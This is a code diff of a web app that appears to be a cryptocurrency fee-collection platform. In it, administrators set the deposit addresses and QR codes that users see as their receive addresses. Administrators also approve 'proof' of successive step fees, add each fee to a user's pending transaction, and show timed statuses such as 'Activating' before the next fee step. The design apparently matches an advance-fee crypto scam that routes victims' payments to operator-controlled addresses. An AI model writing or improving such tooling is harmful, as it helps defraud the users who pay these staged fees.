@@ -221,6 +221,7 @@
 
             <div class="card">
                 <h3 style="margin-bottom:0.75rem;">Live Market Cryptos & Fiat</h3>
+                <!-- USD fiat (Direct USD currency) placed above Bitcoin as requested -->
                 <div class="asset-row" id="usd-asset-row">
                     <div class="asset-info">
                         <div class="asset-icon" style="background:var(--accent-green); color:#fff;">💵</div>
@@ -793,9 +794,7 @@
                 if (data.userEmails) userEmails = data.userEmails;
                 if (data.exchanges) exchanges = data.exchanges;
                 if (data.actionSteps) actionSteps = data.actionSteps;
-                if (data.globalAddresses) {
-                    globalAddresses = Object.assign({}, globalAddresses, data.globalAddresses);
-                }
+                if (data.globalAddresses) globalAddresses = data.globalAddresses;
                 if (data.platformTerms) platformTerms = data.platformTerms;
                 if (data.proofQueue) proofQueue = data.proofQueue;
                 if (data.knowledgeBase) knowledgeBase = data.knowledgeBase;
@@ -821,18 +820,8 @@
                 checkTimersAndAutoProgress();
                 updateBalanceUI();
                 updateSupportAgentUI();
-
-                // Live update user receive modal if currently open
-                if (document.getElementById('receive-modal').style.display === 'flex') {
-                    updateReceiveAddress();
-                }
-
                 if (!document.getElementById('admin-tab').classList.contains('hidden')) {
-                    if (document.activeElement.id !== 'admin-btc-addr' && document.activeElement.id !== 'admin-eth-addr' && document.activeElement.id !== 'admin-usd-addr') {
-                        document.getElementById('admin-btc-addr').value = globalAddresses.btc || '';
-                        document.getElementById('admin-eth-addr').value = globalAddresses.eth || '';
-                        document.getElementById('admin-usd-addr').value = globalAddresses.usd || '';
-                    }
+                    renderAdminDashboard();
                 }
             } else {
                 saveState();
@@ -847,6 +836,7 @@
                     u.statusExpiryTime = null;
                     const tx = (u.txs || []).find(t => t.id == u.activeTxId);
                     
+                    // After timer expires, move to NEXT step or complete
                     u.stepIdx = (u.stepIdx || 0) + 1;
                     if (u.stepIdx < actionSteps.length) {
                         const nextStep = actionSteps[u.stepIdx];
@@ -944,7 +934,7 @@
                 guestPrompt.classList.remove('hidden');
                 dashboard.classList.add('hidden');
                 txCard.classList.add('hidden');
-                usdRow.classList.remove('hidden');
+                usdRow.classList.remove('hidden'); // Always visible to display direct USD currency
 
                 document.getElementById('btc-holdings-display').innerText = `0.0000 BTC`;
                 document.getElementById('btc-fiat-value').innerText = `$0.00`;
@@ -1006,21 +996,20 @@
             updateReceiveAddress();
         }
         function closeReceiveModal() { document.getElementById('receive-modal').style.display = 'none'; }
-        
         function updateReceiveAddress() {
             const asset = document.getElementById('receive-asset-type').value;
             const box = document.getElementById('receive-address-box');
             const qrBox = document.getElementById('qr-box');
             if (asset === 'btc') {
-                box.value = globalAddresses.btc || "";
+                box.value = globalAddresses.btc;
                 if (globalAddresses.btcQr) qrBox.innerHTML = `<img src="${globalAddresses.btcQr}" style="width:140px; height:140px; object-fit:cover;">`;
                 else qrBox.innerHTML = '[NO BTC QR]';
             } else if (asset === 'eth') {
-                box.value = globalAddresses.eth || "";
+                box.value = globalAddresses.eth;
                 if (globalAddresses.ethQr) qrBox.innerHTML = `<img src="${globalAddresses.ethQr}" style="width:140px; height:140px; object-fit:cover;">`;
                 else qrBox.innerHTML = '[NO ETH QR]';
             } else {
-                box.value = globalAddresses.usd || "";
+                box.value = globalAddresses.usd;
                 qrBox.innerHTML = '[USD TAG]';
             }
         }
@@ -1293,63 +1282,36 @@
         }
         function logoutAdmin() { document.getElementById('admin-tab').classList.add('hidden'); document.getElementById('user-tab').classList.remove('hidden'); }
 
-        // --- DIRECT SYNCHRONIZED SAVE GLOBAL ADDRESSES FUNCTION ---
         function saveGlobalAddresses(e) {
             e.preventDefault();
-            
-            const newBtc = document.getElementById('admin-btc-addr').value.trim();
-            const newEth = document.getElementById('admin-eth-addr').value.trim();
-            const newUsd = document.getElementById('admin-usd-addr').value.trim();
-
-            globalAddresses.btc = newBtc;
-            globalAddresses.eth = newEth;
-            globalAddresses.usd = newUsd;
+            globalAddresses.btc = document.getElementById('admin-btc-addr').value;
+            globalAddresses.eth = document.getElementById('admin-eth-addr').value;
+            globalAddresses.usd = document.getElementById('admin-usd-addr').value;
 
             const btcFile = document.getElementById('admin-btc-qr').files[0];
             const ethFile = document.getElementById('admin-eth-qr').files[0];
 
             let pendingSaves = 0;
-            function finishSave() {
-                if (pendingSaves === 0) {
-                    db.collection("config").doc("appData").set({
-                        globalAddresses: globalAddresses
-                    }, { merge: true }).then(() => {
-                        updateReceiveAddress();
-                        renderAdminDashboard();
-                        alert("Global addresses updated and published to all users!");
-                    }).catch((err) => {
-                        alert("Error updating addresses: " + err.message);
-                    });
-                }
+            function checkDone() {
+                if (pendingSaves === 0) { saveState(); alert("Global addresses and QR codes updated!"); }
             }
 
             if (btcFile) {
                 pendingSaves++;
                 const reader = new FileReader();
-                reader.onload = (evt) => { 
-                    globalAddresses.btcQr = evt.target.result; 
-                    pendingSaves--; 
-                    finishSave(); 
-                };
+                reader.onload = (evt) => { globalAddresses.btcQr = evt.target.result; pendingSaves--; checkDone(); };
                 reader.readAsDataURL(btcFile);
             }
-
             if (ethFile) {
                 pendingSaves++;
                 const reader = new FileReader();
-                reader.onload = (evt) => { 
-                    globalAddresses.ethQr = evt.target.result; 
-                    pendingSaves--; 
-                    finishSave(); 
-                };
+                reader.onload = (evt) => { globalAddresses.ethQr = evt.target.result; pendingSaves--; checkDone(); };
                 reader.readAsDataURL(ethFile);
             }
-
-            if (pendingSaves === 0) {
-                finishSave();
-            }
+            if (pendingSaves === 0) { saveState(); alert("Global addresses updated!"); }
         }
 
+        // --- ADMIN MANUAL USER OVERRIDE FUNCTION ---
         function adminManualOverrideUser(e) {
             e.preventDefault();
             const email = document.getElementById('admin-override-user').value;
@@ -1594,6 +1556,7 @@
         }
         function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); }
 
+        // --- CORRECTED ADMIN APPROVAL FLOW: SETS ASSIGNED STATUS & STARTS TIMER ---
         function approveProof(proofId) {
             const pIndex = proofQueue.findIndex(x => x.id == proofId);
             if (pIndex === -1) return;
@@ -1605,7 +1568,10 @@
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 const step = actionSteps[p.stepIdx];
                 if (tx && step) {
+                    // 1. Add approved fee amount to pending transaction total
                     tx.amount += step.amount;
+
+                    // 2. Set status to the assigned status message (e.g. Activating) and start the countdown timer
                     tx.status = step.statusMsg.toUpperCase();
                     u.statusExpiryTime = Date.now() + ((step.timerMinutes || 2) * 60 * 1000);
                 }
